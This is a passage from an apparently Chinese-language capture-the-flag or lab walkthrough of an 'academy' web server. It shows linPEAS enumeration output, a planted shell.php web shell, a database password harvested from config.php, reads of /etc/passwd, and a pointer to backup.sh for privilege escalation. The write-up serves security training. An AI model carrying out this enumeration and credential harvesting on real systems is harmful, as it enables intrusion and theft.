class="string">/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/97</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/99</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9d</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9e</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a0</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a4</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a7</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ae</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/b6</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c3</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c5</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c7</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ca</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/d6</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/dd</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e8</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e9</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/f5</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/fa</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php</span></span><br><span class="line"><span class="string">/var/tmp</span></span><br><span class="line"><span class="string">/var/www/html/academy</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css/bootstrap.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css/font-awesome.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css/style.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/FontAwesome.otf</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/img</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/js</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/js/bootstrap.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/js/jquery-1.11.1.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/check_availability.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/course.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/department.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/edit-course.php</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/config.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/footer.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/header.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/menubar.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/index.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/level.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/logout.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/manage-students.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/print.php</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/assets</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css/bootstrap.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css/font-awesome.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css/style.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/FontAwesome.otf</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.eot</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.woff</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/img</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/js</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/js/bootstrap.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/js/jquery-1.11.1.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/check_availability.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/db</span></span><br><span class="line"><span class="string">/var/www/html/academy/db/onlinecourse.sql</span></span><br><span class="line"><span class="string">/var/www/html/academy/enroll-history.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/enroll.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/config.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/footer.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/header.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/menubar.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/index.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/logout.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/my-profile.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/pincode-verification.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/print.php</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/shell.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                             </span></span><br><span class="line"><span class="string">  Group www-data:                                                                                                             </span></span><br><span class="line"><span class="string">/tmp/linpeas.sh                                                                                                               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            ╔═════════════════════════╗</span></span><br><span class="line"><span class="string">════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                           </span></span><br><span class="line"><span class="string">                            ╚═════════════════════════╝                                                                       </span></span><br><span class="line"><span class="string">╔══════════╣ .sh files in path</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                    </span></span><br><span class="line"><span class="string">/usr/bin/gettext.sh                                                                                                           </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Executable files potentially added by user (limit 70)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Unexpected in /opt (usually empty)</span></span><br><span class="line"><span class="string">total 11332                                                                                                                   </span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root     4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 18 root root     4096 May 29  2021 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  1402271 Jun  3  2020 online-course-registration.zip</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root 10190261 Oct 15  2020 phpMyAdmin-4.9.7-all-languages.tar.gz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Unexpected in root</span></span><br><span class="line"><span class="string">/vmlinuz                                                                                                                      </span></span><br><span class="line"><span class="string">/initrd.img</span></span><br><span class="line"><span class="string">/initrd.img.old</span></span><br><span class="line"><span class="string">/vmlinuz.old</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Modified interesting files in the last 5mins (limit 100)</span></span><br><span class="line"><span class="string">/var/log/auth.log                                                                                                             </span></span><br><span class="line"><span class="string">/var/log/debug.1</span></span><br><span class="line"><span class="string">/var/log/daemon.log.1</span></span><br><span class="line"><span class="string">/var/log/daemon.log</span></span><br><span class="line"><span class="string">/var/log/syslog</span></span><br><span class="line"><span class="string">/var/log/messages.1</span></span><br><span class="line"><span class="string">/var/log/auth.log.1</span></span><br><span class="line"><span class="string">/var/log/syslog.1</span></span><br><span class="line"><span class="string">/var/log/kern.log.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Writable log files (logrotten) (limit 50)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                     </span></span><br><span class="line"><span class="string">logrotate 3.14.0                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Default mail command:       /usr/bin/mail</span></span><br><span class="line"><span class="string">    Default compress command:   /bin/gzip</span></span><br><span class="line"><span class="string">    Default uncompress command: /bin/gunzip</span></span><br><span class="line"><span class="string">    Default compress extension: .gz</span></span><br><span class="line"><span class="string">    Default state file path:    /var/lib/logrotate/status</span></span><br><span class="line"><span class="string">    ACL support:                yes</span></span><br><span class="line"><span class="string">    SELinux support:            yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Files inside /home/www-data (limit 20)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Files inside others home (limit 20)</span></span><br><span class="line"><span class="string">/home/grimmie/.bash_history                                                                                                   </span></span><br><span class="line"><span class="string">/home/grimmie/.bashrc</span></span><br><span class="line"><span class="string">/home/grimmie/backup.sh</span></span><br><span class="line"><span class="string">/home/grimmie/.profile</span></span><br><span class="line"><span class="string">/home/grimmie/.bash_logout</span></span><br><span class="line"><span class="string">/var/www/html/index.html</span></span><br><span class="line"><span class="string">/var/www/html/academy/logout.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/enroll.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/check_availability.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/my-profile.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/print.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/licensed-image.jpeg</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/shell.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/avatar-1.jpg.png</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/noimage.png</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/footer.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/header.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/config.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/menubar.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching installed mail applications</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Mails (limit 50)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Backup files (limited 100)</span></span><br><span class="line"><span class="string">-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                   </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 9716 Nov 28  2020 /usr/lib/modules/4.19.0-13-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 9731 Mar 19  2021 /usr/lib/modules/4.19.0-16-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 348 Nov 25  2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz</span></span><br><span class="line"><span class="string">-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Web files?(output limit)</span></span><br><span class="line"><span class="string">/var/www/:                                                                                                                    </span></span><br><span class="line"><span class="string">total 12K</span></span><br><span class="line"><span class="string">drwxr-xr-x  3 root root 4.0K May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 12 root root 4.0K May 29  2021 ..</span></span><br><span class="line"><span class="string">drwxr-xr-x  3 root root 4.0K May 29  2021 html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html:</span></span><br><span class="line"><span class="string">total 24K</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 root     root     4.0K May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 root     root     4.0K May 29  2021 ..</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 grimmie administrator 220 May 29  2021 /home/grimmie/.bash_logout                                                </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 0 Feb 15 11:15 /run/network/.ifstate.lock</span></span><br><span class="line"><span class="string">-rw------- 1 root root 0 May 29  2021 /etc/.pwd.lock</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                                       </span></span><br><span class="line"><span class="string">-rwxrwxrwx 1 www-data www-data 853290 Feb 15 14:03 /tmp/linpeas.sh                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching passwords in history files</span></span><br><span class="line"><span class="string">Binary file /usr/share/phpmyadmin/js/vendor/openlayers/theme/default/img/navigation_history.png matches                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching passwords in config PHP files</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/config.inc.php:$cfg[&#x27;</span>Servers<span class="string">&#x27;][$i][&#x27;</span>AllowNoPassword<span class="string">&#x27;] = false;                                          </span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/config.sample.inc.php:$cfg[&#x27;</span>Servers<span class="string">&#x27;][$i][&#x27;</span>AllowNoPassword<span class="string">&#x27;] = false;</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/libraries/config.default.php:$cfg[&#x27;</span>Servers<span class="string">&#x27;][$i][&#x27;</span>AllowNoPassword<span class="string">&#x27;] = false;</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/libraries/config.default.php:$cfg[&#x27;</span>ShowChgPassword<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/config.php:$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/config.php:$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching *password* or *credential* files in home (limit 70)</span></span><br><span class="line"><span class="string">/etc/pam.d/common-password                                                                                                    </span></span><br><span class="line"><span class="string">/usr/bin/systemd-ask-password</span></span><br><span class="line"><span class="string">/usr/bin/systemd-tty-ask-password-agent</span></span><br><span class="line"><span class="string">/usr/lib/grub/i386-pc/legacy_password_test.mod</span></span><br><span class="line"><span class="string">/usr/lib/grub/i386-pc/password.mod</span></span><br><span class="line"><span class="string">/usr/lib/grub/i386-pc/password_pbkdf2.mod</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-console.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-console.service</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-wall.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-wall.service</span></span><br><span class="line"><span class="string">  #)There are more creds/passwds files in the previous parent folder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/usr/lib/x86_64-linux-gnu/mariadb19/plugin/mysql_clear_password.so</span></span><br><span class="line"><span class="string">/usr/lib/x86_64-linux-gnu/mariadb19/plugin/simple_password_check.so</span></span><br><span class="line"><span class="string">/usr/share/man/man1/systemd-ask-password.1.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man7/credentials.7.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-console.path.8.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-console.service.8.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-wall.path.8.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-wall.service.8.gz</span></span><br><span class="line"><span class="string">  #)There are more creds/passwds files in the previous parent folder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/usr/share/pam/common-password.md5sums</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/user_password.php</span></span><br><span class="line"><span class="string">/var/cache/debconf/passwords.dat</span></span><br><span class="line"><span class="string">/var/lib/pam/password</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/change-password.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Searching passwords inside logs (limit 70)</span></span><br><span class="line"><span class="string">2021-05-29 17:00:10 install base-passwd:amd64 &lt;none&gt; 3.5.46                                                                   </span></span><br><span class="line"><span class="string">2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:21 install passwd:amd64 &lt;none&gt; 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 &lt;none&gt;</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 &lt;none&gt;</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">Description: Set up users and passwords</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                ╔════════════════╗</span></span><br><span class="line"><span class="string">════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                            </span></span><br><span class="line"><span class="string">                                ╚════════════════╝                                                                            </span></span><br><span class="line"><span class="string">Regexes to search for API keys aren&#x27;</span>t activated, use param <span class="string">&#x27;-r&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通過這工具也找出了不少關於這系統的資訊，及資料庫密碼，更重要的是<strong>backup.sh似乎可以進行PE利用</strong></p>
</li>
<li><p>查看**&#x2F;var&#x2F;www&#x2F;html&#x2F;academy&#x2F;includes&#x2F;config.php檔案內容**</p>
</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> /var/www/html/academy/includes/config.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$mysql_hostname</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_user</span> = <span class="string">&quot;grimmie&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_password</span> = <span class="string">&quot;My_V3ryS3cur3_P4ss&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_database</span> = <span class="string">&quot;onlinecourse&quot;</span>;</span><br><span class="line"><span class="variable">$bd</span> = mysqli_connect(<span class="variable">$mysql_hostname</span>, <span class="variable">$mysql_user</span>, <span class="variable">$mysql_password</span>, <span class="variable">$mysql_database</span>) or die(<span class="string">&quot;Could not connect database&quot;</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time 